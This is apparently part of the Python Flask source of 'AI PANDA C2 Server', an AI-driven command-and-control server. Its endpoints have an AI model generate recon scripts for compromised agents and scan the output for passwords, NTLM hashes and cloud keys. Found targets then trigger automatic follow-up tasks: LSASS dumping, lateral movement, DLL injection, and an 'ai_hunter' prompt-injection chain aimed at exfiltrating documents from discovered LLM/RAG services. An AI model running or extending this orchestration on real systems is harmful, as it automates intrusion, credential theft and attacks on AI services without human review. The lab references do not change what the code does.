            # ── CrowdStrike AI path ─────────────────────────────────────────
            cs_client = CrowdStrikeAIClient(CROWDSTRIKE_CONFIG_PATH)
            ai_response = cs_client.run_workflow(CROWDSTRIKE_WORKFLOW_ID, prompt)

            if "RECON_COMPLETE" in ai_response:
                session["status"] = "completed"
                session["completion_reason"] = "AI determined goal achieved"
                return

            if language == "python":
                code = clean_python_response(ai_response)
            elif language == "powershell":
                code = clean_powershell_response(ai_response)
            else:
                import re as _re
                m = _re.search(r"```(?:bash|sh)?\s*(.*?)```", ai_response, _re.DOTALL | _re.IGNORECASE)
                code = m.group(1).strip() if m else ai_response.strip()
                if not code.startswith("#!/bin/bash"):
                    code = "#!/bin/bash\n" + code

            reasoning_lines = [l for l in ai_response.split("\n") if l.strip() and not l.strip().startswith(("#", "$", "import", "Get-", "Write-", "#!/"))]
            reasoning = reasoning_lines[0][:200] if reasoning_lines else f"Step {step_num} recon script"
        else:
            # ── Mock fallback: pre-written recon scripts ────────────────────
            logger.info(f"AutoRecon step {step_num}: CrowdStrike not configured — using mock script")
            reasoning, code = _mock_autorecon_script(step_num - 1, language)

        task_id = str(uuid.uuid4())
        lang_tag = {"python": "#python", "powershell": "#ps", "bash": "#bash"}.get(language, "#ps")
        tasks[task_id] = {
            "id": task_id,
            "agent_id": session["agent_id"],
            "task_type": "autorecon",
            "code": f"{lang_tag}\n{code}",
            "status": "pending",
            "created_at": datetime.now().isoformat(),
            "autorecon_session_id": session_id,
            "step_num": step_num,
        }

        step = {
            "step_num": step_num,
            "script": code,
            "language": language,
            "reasoning": reasoning,
            "status": "pending",
            "task_id": task_id,
            "created_at": datetime.now().isoformat(),
            "result": None,
        }
        session["steps"].append(step)
        session["current_step"] = step_num
        session["current_task_id"] = task_id
        logger.info(f"AutoRecon session {session_id}: deployed step {step_num} (task {task_id})")

    except Exception as e:
        logger.error(f"AutoRecon step generation error: {e}")
        session["status"] = "error"
        session["error"] = str(e)


@app.route("/autorecon/start", methods=["POST"])
def autorecon_start():
    """Start an autonomous reconnaissance chain for a given agent."""
    try:
        data = request.json
        agent_id = data.get("agent_id")
        goal = data.get("goal", "Perform comprehensive system reconnaissance")
        language = data.get("language", "powershell")
        max_steps = int(data.get("max_steps", 5))

        if not agent_id:
            return jsonify({"status": "error", "message": "Missing agent_id"}), 400

        session_id = str(uuid.uuid4())
        autorecon_sessions[session_id] = {
            "id": session_id,
            "agent_id": agent_id,
            "goal": goal,
            "language": language,
            "max_steps": max_steps,
            "current_step": 0,
            "status": "running",
            "steps": [],
            "created_at": datetime.now().isoformat(),
            "current_task_id": None,
            "completion_reason": None,
            "error": None,
        }

        _autorecon_deploy_next_step(session_id)

        return jsonify({"status": "success", "session_id": session_id})

    except Exception as e:
        logger.error(f"AutoRecon start error: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/autorecon/status/<session_id>", methods=["GET"])
def autorecon_status(session_id):
    """Poll the status of an autorecon session; advance chain when a step completes."""
    try:
        session = autorecon_sessions.get(session_id)
        if not session:
            return jsonify({"status": "error", "message": "Session not found"}), 404

        # Advance chain if current task completed
        if session["status"] == "running" and session["current_task_id"]:
            current_task = tasks.get(session["current_task_id"])
            if current_task and current_task.get("status") == "completed":
                # Find associated result
                for result_data in results.values():
                    if result_data.get("task_id") == session["current_task_id"]:
                        current_step_obj = next(
                            (s for s in session["steps"] if s["task_id"] == session["current_task_id"]),
                            None,
                        )
                        if current_step_obj:
                            current_step_obj["result"] = str(result_data.get("data", ""))[:2000]
                            current_step_obj["status"] = "completed"
                        break

                session["current_task_id"] = None
                _autorecon_deploy_next_step(session_id)

        return jsonify({
            "status": "success",
            "session": {
                "id": session["id"],
                "status": session["status"],
                "current_step": session["current_step"],
                "max_steps": session["max_steps"],
                "goal": session["goal"],
                "language": session["language"],
                "created_at": session["created_at"],
                "completion_reason": session.get("completion_reason"),
                "error": session.get("error"),
                "steps": session["steps"],
                "ai_hunter_target": session.get("ai_hunter_target"),
                "ai_hunter_credentials": session.get("ai_hunter_credentials"),
            },
        })

    except Exception as e:
        logger.error(f"AutoRecon status error: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/autorecon/analyze_step", methods=["POST"])
def autorecon_analyze_step():
    """
    Analyze the results of a completed AutoRecon step with AI.
    Identifies actionable intelligence (credentials, hosts, tokens, privesc paths)
    and, when confident, automatically queues the appropriate follow-up task.
    """
    try:
        data = request.json
        session_id = data.get("session_id")
        step_num = int(data.get("step_num", 0))
        auto_execute = data.get("auto_execute", True)

        session = autorecon_sessions.get(session_id)
        if not session:
            return jsonify({"status": "error", "message": "Session not found"}), 404

        step = next((s for s in session["steps"] if s["step_num"] == step_num), None)
        if not step:
            return jsonify({"status": "error", "message": "Step not found"}), 404
        if not step.get("result"):
            return jsonify({"status": "error", "message": "Step has no results yet"}), 400

        analysis_prompt = f"""You are an expert red team analyst reviewing reconnaissance output.

Session goal: {session['goal']}

Recon results from step {step_num}:
{str(step['result'])[:3000]}

Your task:
1. Identify every piece of actionable intelligence in these results:
   - Credentials: passwords, NTLM hashes, Kerberos tickets, API keys, SSH keys, tokens
   - Network targets: IPs, hostnames, open ports, SMB shares, RDP hosts, SSH hosts
   - Cloud artifacts: AWS access keys, Azure tokens, GCP service account keys, metadata endpoints
   - Privilege escalation: writable service paths, unquoted service paths, AlwaysInstallElevated, weak ACLs
   - Lateral movement: discovered hosts reachable via SSH/WMI/PSExec
   - LLM/AI services: any Flask API with /health, /api/chat, /auth/login endpoints — especially RAG applications,
     Ollama instances, or LLM chatbots exposed on common ports (11434, 8080, 5000, 8000, 1234, 3000).
     These are high-value targets for prompt injection attacks.

2. For each finding suggest ONE specific follow-up action from this exact list:
   - "lsass"     → dump LSASS memory (use when: NTLM hash, SAM db, credential store found)
   - "lateral"   → SSH/WMI lateral movement (use when: remote host IPs + credentials found)
   - "cloud"     → enumerate cloud environment (use when: AWS/Azure/GCP keys or metadata URL found)
   - "dll"       → DLL injection / persistence (use when: writable system path or privesc found)
   - "recon"     → extended recon on new subnet or host (use when: new IPs/subnets discovered)
   - "ai_hunter" → LLM prompt injection attack chain (use when: an LLM/RAG/AI API service is found —
                    include the discovered URL as the "target_url" field in the action,
                    and include any discovered credentials as "credentials")

Rules:
- Only suggest actions directly justified by the findings.
- Set auto_execute=true ONLY when the finding is clear and unambiguous.
- Set auto_execute=false when the suggestion is speculative.
- Do NOT invent data that is not in the output.

Respond with ONLY valid JSON in this exact schema (no markdown, no explanation):
{{
  "summary": "<one-sentence summary of key findings>",
  "findings": [
    {{"type": "credential|network|cloud|privesc|llm_service|other", "description": "<what was found>", "value": "<the actual value/IP/path/URL>", "severity": "critical|high|medium|low"}}
  ],
  "suggested_actions": [
    {{"action_type": "lsass|lateral|cloud|dll|recon|ai_hunter", "reason": "<why this action is warranted>", "auto_execute": true|false, "priority": 1, "target_url": "<optional: URL for ai_hunter>", "credentials": []}}
  ]
}}"""

        if not CROWDSTRIKE_WORKFLOW_ID or not crowdstrike_config:
            # Fallback: keyword-based analysis with LLM service detection
            result_text = str(step["result"]).lower()
            findings = []
            suggested_actions = []

            if any(k in result_text for k in ["password", "hash", "ntlm", "sam "]):
                findings.append({"type": "credential", "description": "Potential credentials detected in output", "value": "see raw results", "severity": "high"})
                suggested_actions.append({"action_type": "lsass", "reason": "Credential indicators found — dump LSASS for full credential set", "auto_execute": False, "priority": 1})

            if any(k in result_text for k in ["192.168.", "10.0.", "172.16.", "ssh", "smb", "rdp"]):
                findings.append({"type": "network", "description": "Remote hosts or network services discovered", "value": "see raw results", "severity": "medium"})
                suggested_actions.append({"action_type": "lateral", "reason": "Network hosts detected — attempt lateral movement", "auto_execute": False, "priority": 2})

            if any(k in result_text for k in ["aws", "azure", "gcp", "s3", "access_key", "metadata"]):
                findings.append({"type": "cloud", "description": "Cloud artifacts detected", "value": "see raw results", "severity": "high"})
                suggested_actions.append({"action_type": "cloud", "reason": "Cloud credentials or metadata endpoint found", "auto_execute": False, "priority": 1})

            # LLM/AI service detection
            llm_url = None
            import re as _re
            # Look for URLs with common LLM ports
            for pattern in [r'http://[\w.]+:(?:8080|5000|11434|8000|1234|3000)', r'localhost:(?:8080|5000|11434|8000)']:
                m = _re.search(pattern, str(step["result"]))
                if m:
                    llm_url = m.group()
                    break
            llm_keywords = ["ollama", "/api/chat", "/health", "llm", "rag", "ai_assistant", "corpaai", "ai security lab", "flask", "neural nexus skill"]
            if any(k in result_text for k in llm_keywords) or llm_url:
                url_val = llm_url or "http://localhost:8080"
                findings.append({"type": "llm_service", "description": "LLM/RAG AI service detected — potential prompt injection target", "value": url_val, "severity": "critical"})
                suggested_actions.append({
                    "action_type": "ai_hunter",
                    "reason": "AI/LLM service found — launch prompt injection attack chain to extract documents beyond authorized scope",
                    "auto_execute": True,
                    "priority": 1,
                    "target_url": url_val,
                    "credentials": LAB_TARGET["credentials"]
                })

            analysis = {
                "summary": f"Keyword-based analysis of step {step_num} results (AI not configured)",
                "findings": findings,
                "suggested_actions": suggested_actions
            }
        else:
            try:
                cs_client = CrowdStrikeAIClient(CROWDSTRIKE_CONFIG_PATH)
                ai_response = cs_client.run_workflow(CROWDSTRIKE_WORKFLOW_ID, analysis_prompt)

                # Extract JSON from response
                json_match = re.search(r'\{[\s\S]*\}', ai_response)
                if json_match:
                    analysis = json.loads(json_match.group())
                else:
                    analysis = {
                        "summary": ai_response[:300],
                        "findings": [],
                        "suggested_actions": []
                    }
            except json.JSONDecodeError:
                analysis = {
                    "summary": "AI response could not be parsed as JSON",
                    "findings": [],
                    "suggested_actions": []
                }
            except Exception as e:
                logger.error(f"AutoRecon step analysis AI error: {e}")
                analysis = {"summary": f"Analysis error: {str(e)}", "findings": [], "suggested_actions": []}

        # Auto-execute high-confidence suggested actions
        executed_tasks = []
        ALLOWED_AUTO_TYPES = {"lsass", "lateral", "cloud", "dll", "recon", "ai_hunter"}

        if auto_execute:
            # Sort by priority
            actions = sorted(analysis.get("suggested_actions", []), key=lambda a: a.get("priority", 99))
            for action in actions:
                if not action.get("auto_execute"):
                    continue
                action_type = action.get("action_type", "")
                if action_type not in ALLOWED_AUTO_TYPES:
                    continue

                try:
                    if action_type == "ai_hunter":
                        # Special handling: record as an ai_hunter task with target metadata
                        target_url = action.get("target_url", "http://localhost:8080")
                        creds = action.get("credentials", LAB_TARGET["credentials"])
                        task_id = str(uuid.uuid4())
                        tasks[task_id] = {
                            "id": task_id,
                            "agent_id": session["agent_id"],
                            "task_type": "ai_hunter",
                            "code": f"# AI Hunter auto-triggered by AutoRecon\n# Target: {target_url}",
                            "status": "pending",
                            "created_at": datetime.now().isoformat(),
                            "autorecon_triggered": True,
                            "autorecon_session_id": session_id,
                            "trigger_step": step_num,
                            "trigger_reason": action.get("reason", ""),
                            "ai_hunter_config": {
                                "target_url": target_url,
                                "strategy": "data_exfil",
                                "credentials": creds,
                            },
                        }
                        # Store AI Hunter target in the session for the UI to pick up
                        session["ai_hunter_target"] = target_url
                        session["ai_hunter_credentials"] = creds
                    else:
                        code = generate_code(action_type, {"triggered_by": "autorecon", "step": step_num})
                        task_id = str(uuid.uuid4())
                        tasks[task_id] = {
                            "id": task_id,
                            "agent_id": session["agent_id"],
                            "task_type": action_type,
                            "code": code,
                            "status": "pending",
                            "created_at": datetime.now().isoformat(),
                            "autorecon_triggered": True,
                            "autorecon_session_id": session_id,
                            "trigger_step": step_num,
                            "trigger_reason": action.get("reason", ""),
                        }
                    executed_tasks.append({
                        "task_id": task_id,
                        "task_type": action_type,
                        "reason": action.get("reason", ""),
                        "target_url": action.get("target_url"),
                    })
                    logger.info(
                        f"AutoRecon auto-executed '{action_type}' task {task_id} "
                        f"(session {session_id}, step {step_num})"
                    )
                except Exception as e:
                    logger.error(f"Failed to auto-execute {action_type}: {e}")

        # Persist analysis back into the step so the status endpoint returns it
        step["ai_analysis"] = analysis
        step["auto_executed_tasks"] = executed_tasks

        return jsonify({
            "status": "success",
            "analysis": analysis,
            "auto_executed": executed_tasks,
        })

    except Exception as e:
        logger.error(f"AutoRecon analyze_step error: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/autorecon/execute_suggestion", methods=["POST"])
def autorecon_execute_suggestion():
    """Manually execute a suggested action from an AutoRecon step analysis."""
    try:
        data = request.json
        session_id = data.get("session_id")
        action_type = data.get("action_type")
        reason = data.get("reason", "Manual execution from AutoRecon suggestion")

        if action_type not in {"lsass", "lateral", "cloud", "dll", "recon", "custom"}:
            return jsonify({"status": "error", "message": "Invalid action type"}), 400

        session = autorecon_sessions.get(session_id)
        if not session:
            return jsonify({"status": "error", "message": "Session not found"}), 404

        code = generate_code(action_type, {"triggered_by": "autorecon_manual"})
        task_id = str(uuid.uuid4())
        tasks[task_id] = {
            "id": task_id,
            "agent_id": session["agent_id"],
            "task_type": action_type,
            "code": code,
            "status": "pending",
            "created_at": datetime.now().isoformat(),
            "autorecon_triggered": True,
            "autorecon_session_id": session_id,
            "trigger_reason": reason,
        }

        logger.info(f"AutoRecon manual suggestion executed: {action_type} task {task_id}")
        return jsonify({"status": "success", "task_id": task_id, "task_type": action_type})

    except Exception as e:
        logger.error(f"AutoRecon execute_suggestion error: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/autorecon/stop/<session_id>", methods=["POST"])
def autorecon_stop(session_id):
    """Stop a running autorecon session."""
    try:
        session = autorecon_sessions.get(session_id)
        if not session:
            return jsonify({"status": "error", "message": "Session not found"}), 404
        session["status"] = "stopped"
        return jsonify({"status": "success", "message": "Session stopped"})
    except Exception as e:
        logger.error(f"AutoRecon stop error: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/autorecon/sessions", methods=["GET"])
def autorecon_list_sessions():
    """List all autorecon sessions (summary)."""
    try:
        summaries = []
        for s in autorecon_sessions.values():
            summaries.append({
                "id": s["id"],
                "agent_id": s["agent_id"],
                "goal": s["goal"][:80],
                "status": s["status"],
                "current_step": s["current_step"],
                "max_steps": s["max_steps"],
                "created_at": s["created_at"],
            })
        summaries.sort(key=lambda x: x["created_at"], reverse=True)
        return jsonify({"status": "success", "sessions": summaries})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint for monitoring"""
    try:
        return jsonify({
            "status": "healthy",
            "timestamp": datetime.now().isoformat(),
            "agents": len(agents),
            "tasks": len(tasks),
            "results": len(results),
            "crowdstrike_configured": bool(CROWDSTRIKE_WORKFLOW_ID and crowdstrike_config),
            "ai_enabled_for_attacks": USE_AI,
            "ai_always_enabled": ["chat", "obfuscator", "analysis", "test_prompts"],
            "fallback_payloads_loaded": len(fallback_payloads),
            "available_payloads": list(fallback_payloads.keys()),
            "malware_library_scripts": len(malware_library.get("scripts", [])),
            "autorecon_sessions": len(autorecon_sessions)
        })
    except Exception as e:
        logger.error(f"Health check failed: {str(e)}")
        return jsonify({"status": "unhealthy", "error": str(e)}), 500

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="AI PANDA C2 Server")
    parser.add_argument('--auto', action='store_true', help='Enable automatic playbook execution')
    parser.add_argument('--playbook', type=str, default='playbook.json', help='Path to the playbook JSON')
    parser.add_argument('--schedule', type=int, default=7, help='Days between playbook executions')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode with short interval')
    parser.add_argument('--no-ai', action='store_true', help='Disable AI for attack task generation (Chat/Obfuscator/Analysis always use AI)')

    args = parser.parse_args()
    if args.no_ai:
        USE_AI = False
        logger.info("AI mode DISABLED for attack tasks (Chat/Obfuscator/Analysis still use AI)")
    
    validate_configuration()
    
    if args.auto:
        from playbook_runner import run_playbook_loop
        run_playbook_loop(args.playbook, args.schedule, debug=args.debug)
    else:
        logger.info(f"Starting AI PANDA server on {HOST}:{PORT}")
        logger.info(f"Debug mode: {DEBUG}")
        logger.info(f"AI Mode for Attack Tasks: {'ENABLED' if USE_AI else 'DISABLED (Using Fallback Code)'}")
        logger.info("AI Mode for Chat/Obfuscator/Analysis: ALWAYS ENABLED")
        logger.info(f"CrowdStrike workflow configured: {bool(CROWDSTRIKE_WORKFLOW_ID and crowdstrike_config)}")
        logger.info(f"Fallback payloads loaded: {len(fallback_payloads)}")
        logger.info(f"Malware library scripts: {len(malware_library.get('scripts', []))}")
        app.run(debug=DEBUG, host=HOST, port=PORT)
